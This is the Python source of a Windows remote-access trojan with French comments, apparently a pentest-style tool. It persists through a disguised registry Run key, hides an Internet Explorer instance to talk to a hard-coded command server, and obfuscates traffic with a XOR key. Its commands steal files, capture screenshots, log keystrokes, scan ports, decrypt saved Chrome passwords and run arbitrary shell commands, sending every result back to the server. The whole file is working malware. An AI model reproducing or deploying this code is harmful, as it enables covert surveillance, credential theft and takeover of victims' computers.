# -*- coding: utf-8 -*-

import requests
import subprocess
import time, datetime
import os
import shutil
import _winreg as wreg
import random
from PIL import ImageGrab
import tempfile
import socket
import HTTP_reverse_shell_client
import pythoncom, pyHook
import threading
import pyperclip
import sqlite3
import win32crypt
from os import getenv
from shutil import copyfile
from win32com.client import Dispatch
from time import sleep
import base64

URL_SERVER = "http://10.142.10.22"
FLAGS = 0
TARGETFRAME = ""
IE = None
PATH_LOGS = ""
STORE = ""

WHATISTHIS = 'bv0JGFncE655pm6h09k4b1AxEvSygMD5ZwUXQEekiWdSeOiE1CyGqnPaWwDNnBQUcJAWOGFRwU2KfjOerxsJNcUmxMuuUtOXupTtAUi9rNIm2sVa9HMue6vznNyyrAWX1h5acF4iBc9MrYSMult1DQjzmLGD4d5BIRxuxwfmzYjvA0wHHAcp1lk3hfQC6dWeLAJbq89E1O3AmNhOM49QsYwx2fy6YLZEzn0udCPUzrzUq5rqx0RifKpgoEWPK0C1mjfvSnH51mwti23d0irclpEBcs6n2b525VrM4gsY6R2DSMbUnasCsi4H6bJb6YgnrZBmg1z1xmRwQJ3AmVjALuNp9q0uOfYvgZFpMkQXN6KVA2Jn9yqhhZOXMgMi58tpAAHgG8qQ0Co6bC6fs31p6rf6a8xdmSg0n1KLQ2QZhfTDp64lB4MDpKDrT1RLHIt6wfBQBjwB9Atg5lyV8bhUNlaI8B8t0lXVc6M2CMGyCr0Ndhr4w4NHuWppgXvxi4CTElVL1dG131Fa5zzmVVaRzIB8vCm66HuiQAR1SgjDmR05cP9XRA6MWbl9KRoLgKAsqGyE4tjhUWF2dVSDD1jmTpIpCCfMEg63zNNNTgHhlkxg6sA6KTLk8DlV1MoENl5PzpUVfxXJ1CA4UvmmVP1zHmHnth1ORdckh2GQPIVguGMWBN4S6y1QCtn6SVTZNgKnMNHfkZJg5Pdo6kN4Tpo0Anj3afymLqaEBZHaNwThW0OWHtEtHacG2k5prCXz63LKLO1w01bFxH26UzqP1vveMvvOI0ImX0GidCBeFfPUJE86y5zi1vyY5l9GxGcP13uWmbONQawWG4S6iGjEGVoTaQSBZoyT3pDF3l3MRnRMgOQlymsF1oA46eHYuNKfBa2slXx8gE8VW9zrariVzppKszhWJSxqwehcbqYBAmklv4twwvFt0WX4TUWrAQukCXjoSzIgJc20WMAgNtBn6U5SNPYZgn51HcimSrC4KWQ4zPtCLNg68KrUgMPwqHGgBhat'

class ThreadingKeylogger(threading.Thread):

	STORE = ""
	PATH = ""
	
	def __init__(self, path):
		threading.Thread.__init__(self)
		self.PATH = path

	def run(self):
		obj = pyHook.HookManager()
		obj.KeyDown = self.keypressed
		obj.HookKeyboard()
		pythoncom.PumpMessages()
	
	def keypressed(self, event):
	
		if int(event.Ascii) == 13:
			keys='<ENTER>'
		elif int(event.Ascii) == 8:
			keys='<RETURN>'
		elif int(event.Ascii) == 8:
			keys='<RETURN>'
		else:
			keys=chr(int(event.Ascii))

		self.STORE = self.STORE + keys
	
		fp = open(str(self.PATH), "w")
		fp.write(self.STORE)
		fp.close()
		


#Persistence
# path courant
path = os.getcwd().strip('/n')
print path

# user profile
Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')

# destination outil
destination = userprof.strip('\n\r') + '\\Documents\\' + 'HTTP_reverse_shell_client.exe'

#Si 1ere execution
if not os.path.exists(destination):

    # Copie executable
    shutil.copyfile(path+'\\HTTP_reverse_shell_client.exe', destination)
    print 'Fichier copie'

    #cle de registre
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
    key.Close()
    print 'cle cree'

def chiffre(s1):
	s2 = WHATISTHIS
	while len(s1) > len(s2):
		s2 += WHATISTHIS
	return base64.b64encode("".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s1, s2)]))


def dechiffre(s1):
	s1 = base64.b64decode(s1)
	s2 = WHATISTHIS
	while len(s1) > len(s2):
		s2 += WHATISTHIS
	return "".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s2, s1)])
	

def scanner(ip, ports):
	
	scan_result = 'Scan des ports specifies pour l\'hote: '+ip+'\n'
	
	port_range = []
	if len(ports.split(',')) != 1:
		for port in ports.split(','):
			port_range.append(str(port))
			
	elif len(ports.split('-')) != 1:
		min, max = ports.split('-')
		for i in range(int(min), int(max)):
			port_range.append(str(i))
			
	for port in port_range:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			output = sock.connect_ex((ip, int(port)))
			
			if output == 0:
				scan_result = scan_result + "[+] Port "+port+" est ouvert! \n"
			else:
				scan_result = scan_result + "[+] Port "+port+" est ferme ou la cible est indisponible \n"
				
			sock.close()
			
		except Exception as e:
			pass
	
	PostData = buffer(chiffre(scan_result))
	HTTP_reverse_shell_client.IE.Navigate(URL_SERVER, FLAGS, TARGETFRAME, PostData)

def connect():

	while True:
	
		IE.Navigate(URL_SERVER)
				
		while IE.ReadyState != 4:
			sleep(1)
			
		command = IE.Document.body.innerHTML
		command = dechiffre(command)

    
		#Commande FERMER
		if 'fermer' in command:
			IE.Quit()
			return 1

			
		#Commande AIDE
		elif 'aide' in command:
			data = '\n'
			data += 'Les commandes utilisables:\n'
			data += '	aide -> affiche cette aide\n'
			data += '	vol [file] -> recuperer un fichier sur la cible, ex: vol fichier\\a\\recuperer \n'
			data += '	capture -> prendre un screenshot de la cible\n'
			data += '	chercher [path]*[extension] -> rechercher a l\'interieur du repertoire "path" les fichiers de type "extension", ex: chercher C:\\\\*.pdf\n'
			data += '	cd [path] -> changer de path courant, ex: cd C:\\\\Users\\Desktop\\\n'
			data += '	scan [ip]:[ports] -> scanner les ports de l\'hote "ip". Ports specifies (1,2,3...) ou sous forme d\'ecart (1-5), ex: scan 10.10.10.10:1-500 ou scan 10.10.10.10:80, 8080, 453\n'			
			data += '	keylogger [path] -> lance un keylogger, si aucun path n\'est precise il enregistre dans le fichier "logs.txt" dans le repertoire courant. Attention aux droits d\'ecriture\n'			
			data += '	chrome-pass -> vole les identifiants et mot de passe enregistres par l\'utilisateur dans son naviguateur Google Chrome\n'
			data += '\n By propA - Magellan Consulting\n'
			PostData = buffer(chiffre(data))
			IE.Navigate(URL_SERVER, FLAGS, TARGETFRAME, PostData)

			
		#Commande VOL
		elif 'vol' in command:
			cmd = command.split(' ')

			if len(cmd) >= 2:
				vol = cmd[0]

				path = ""
				for i in range(1, len(cmd)):
					path += cmd[i]
					path += " "
				path = path[:-1]

				if os.path.exists(path):
					PostData = buffer(chiffre("Nom du fichier: "+path))
					IE.Navigate(URL_SERVER+"/nomDeFichier", FLAGS, TARGETFRAME, PostData)
					
					time.sleep(1)
					
					with open(path, 'rb') as o:
						data = o.read()
					Headers = "Content-Type: multipart/form-data\r\n"
					PostData = buffer(chiffre(data))
					IE.Navigate(URL_SERVER+"/store", FLAGS, TARGETFRAME, PostData, Headers)
				else:
					PostData = buffer(chiffre("Fichier introuvable"))
					IE.Navigate(URL_SERVER+"/nomDeFichier", FLAGS, TARGETFRAME, PostData)

			else:
				PostData = buffer(chiffre("probleme d'arguments, ex: vol fichier\a\voler"))
				IE.Navigate(URL_SERVER, FLAGS, TARGETFRAME, PostData)

				
		# Commande CAPTURE
		elif 'capture' in command:
		
			filename = "snapshot-"+str(datetime.datetime.now()).replace(' ', '_').replace('.', '-').replace(':', '-')+".jpg"
			IE.Navigate(URL_SERVER+"/nomDeFichier", FLAGS, TARGETFRAME, PostData)
		
			
			dirpath = tempfile.mkdtemp()
			
			ImageGrab.grab().save(dirpath+'\\'+filename, "JPEG")
			time.sleep(1)
			
			with open(dirpath+'\\'+filename, 'rb') as o:
				data = o.read()
				
			PostData = buffer(chiffre(data))	
			Headers = "Content-Type: multipart/form-data\r\n"
			IE.Navigate(URL_SERVER+"/store", FLAGS, TARGETFRAME, PostData, Headers)
			
			shutil.rmtree(dirpath)

		
		#Commande CHERCHER
		elif 'chercher' in command:
			command = command[9:]
			path,ext = command.split('*')
			
			ext = ext.replace(" ", "")
			
			list = ''
			for dirpath, dirname, files in os.walk(path):
				for file in files:
					if file.endswith(ext):
						list += '\n' + os.path.join(dirpath, file)
			if list != '':
				PostData = buffer(chiffre("list: \n"+list))
				IE.Navigate(URL_SERVER, FLAGS, TARGETFRAME, PostData)
			else:
				PostData = buffer(chiffre("Pas de fichier de type \'"+ext+"\' dans le path \'"+path))
				IE.Navigate(URL_SERVER, FLAGS, TARGETFRAME, PostData)		
			
			
		#Commande CD
		elif 'cd' in command:
			
			cmd = command.split(' ')

			if len(cmd) >= 2:
				cd = cmd[0]

				path = ""
				for i in range(1, len(cmd)):
					path += cmd[i]
					path += " "
				path = path[:-1]
			
				os.chdir(path)
				PostData = buffer(chiffre("[+] CWD is "+os.getcwd()))
				IE.Navigate(URL_SERVER, FLAGS, TARGETFRAME, PostData)
			else:
				PostData = buffer(chiffre("[-] Probleme d'arguments dans la commande"))
				IE.Navigate(URL_SERVER, FLAGS, TARGETFRAME, PostData)
				
		
		#Commande SCAN
		elif 'scan' in command:
			command = command[5:]
			ip, ports = command.split(':')
			scanner(ip, ports)
			
			
		#Commande KEYLOGGER
		elif 'keylogger' in command:
		
			path = "log.txt"
			if len(command) != 9:
				cmd = command.split(' ')
				path = ""
				for i in range(1, len(cmd)):
					path += cmd[i]
					path += " "
				path = path[:-1]
				
			
			
			test = ThreadingKeylogger(path) 
			test.deamon = True			
			test.start()
			
			PostData = buffer(chiffre("[+] Le keylogger est maintenant lance, vous pouvez voir ses resultats dans: "+path))
			IE.Navigate(URL_SERVER, FLAGS, TARGETFRAME, PostData)
			
			
			
		#Commande CHROME-PASS
		elif 'chrome-pass' in command:
			path = getenv("LOCALAPPDATA") + "\Google\Chrome\User Data\Default\Login Data"
			path2 = getenv("LOCALAPPDATA") + "\Google\Chrome\User Data\Default\Login2"
			copyfile(path, path2)
			
			conn = sqlite3.connect(path2)
			cursor = conn.cursor()
			cursor.execute("SELECT action_url, username_value, password_value FROM logins")
			
			data = "url du site | username | password \n"
			for raw in cursor.fetchall():
				data += str(raw[0]) + " | " + str(raw[1]) + " | " + win32crypt.CryptUnprotectData(raw[2])[1] + "\n"
			
			conn.close()
			PostData = buffer(chiffre(data))
			IE.Navigate(URL_SERVER, FLAGS, TARGETFRAME, PostData)
			
		
		#Commande entree ou vide
		elif '\n' == command or ' ' == command:
			data = ["Machine cible disponible, elle attend juste des ordres!", "propA, reprend toi!", "Au boulot!", "Tu as interet de tout poncer!", "Admin Dom! Admin Dom! Admin Dom!"]
			i = random.randrange(0, len(data))
			PostData = buffer(chiffre(data[i]))
			IE.Navigate(URL_SERVER, FLAGS, TARGETFRAME, PostData)

			
		#Commande Windows classique
		else:
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			#post_response = requests.post(url=URL_SERVER, data=str(CMD.stdout.read()))
			#post_response = requests.post(url=URL_SERVER, data=str(CMD.stderr.read()))
			
			Data = CMD.stdout.read()
			Data += CMD.stderr.read()
			PostData = buffer(chiffre(Data))
			IE.Navigate(URL_SERVER, FLAGS, TARGETFRAME, PostData)

		time.sleep(1)
	
while True:

	
	try:
		IE = Dispatch("InternetExplorer.Application")
		IE.Visible = 0
		if connect() == 1:
			break
	except Exception as e:
		print 'Error1: '+str(e)
		sleep_for = random.randrange(1, 10) #* 60
		time.sleep(sleep_for)
		pass



		
		

		